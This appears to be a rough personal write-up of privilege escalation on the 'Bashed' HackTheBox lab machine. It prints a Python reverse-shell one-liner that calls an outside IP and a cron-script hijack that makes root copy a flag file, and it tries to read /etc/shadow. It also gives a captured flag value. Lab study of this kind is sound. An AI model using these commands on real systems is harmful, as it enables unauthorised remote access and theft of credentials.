Previously in... [[Boxes/HackTheBox Writeups/Legacy/Bashed/Enumeration]]

We found a terminal and we got our first [[flag]]

We also found a bad joojoo file that we can exploit ```:/home# sudo -l

  
Matching Defaults entries for www-data on bashed:  
env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL```

let's add our own bash code into it and run it on sudo for root access!

`bash -i`
hmm... we can't edit that file but we can make a nc shell OR wget a shell.sh to their dir
```
www-data@bashed
:/# uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86\_64 x86\_64 x86\_64 GNU/Linux
```

`
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.193",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
`

```www-data@bashed

:/var/www# python \\-c 'import socket,subprocess,os;s=socket.socket(socket.AF\\\_INET,socket.SOCK\\\_STREAM);s.connect(("10.10.16.193",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

  
File "", line 1  
import socket,subprocess,os;s=socket.socket(socket.AF\\\_INET,socket.SOCK\\\_STREAM);s.connect(("10.10.16.193",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

[[etcpasswd]]

/usr/bin/gpasswd
-rwsr-xr-x 1 root root        40K Mar 29  2016 /usr/bin/chsh
```

CRON job exploit:

`
scriptmanager@bashed:/scripts$ ls
ls
test.py  test.txt
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ ls -la
`
`drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py < script manager access
-rw-r--r--  1 root          root            12 May 20 15:04 test.txt < Root access
`

`scriptmanager@bashed:/scripts$ echo "" > test.py
echo "" > test.py
scriptmanager@bashed:/scripts$ echo 'f=open("test.txt","w");g=open("/root/root.txt","r").read();f.write(g);f.close()' > test.py

<","w");g=open("/root/flag.txt","r").read();f.write(g);f.close()' > test.py  `

`scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
cc4f0afe3a1026d402ba10329674a8e2
scriptmanager@bashed:/scripts$ 
`

`echo 'f=open("test.txt","w");g=open("/etc/shadow.txt","r").read();f.write(g);f.close()' > test.py
`
